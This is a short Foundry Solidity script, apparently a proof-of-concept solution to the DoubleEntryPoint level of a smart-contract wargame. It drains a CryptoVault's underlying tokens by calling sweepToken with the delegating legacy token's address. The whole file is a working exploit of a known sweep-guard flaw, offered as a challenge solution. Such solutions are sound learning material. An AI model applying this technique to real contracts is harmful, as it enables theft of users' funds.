// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../instances/Ilevel26.sol";

contract POC is Script {

     DoubleEntryPoint level26 = DoubleEntryPoint(0xBDc7cd60eca4b6EA63A4e5A37d543Ff803B6D6DA);
    function run() external{
        vm.startBroadcast();

        CryptoVault vault = CryptoVault(level26.cryptoVault());
        address DET = address(vault.underlying());
        address LGT = level26.delegatedFrom();
        vault.sweepToken(IERC20(LGT)); //calling sweepToken with LGT address on the CryptoVault
        
        vm.stopBroadcast();
    }
}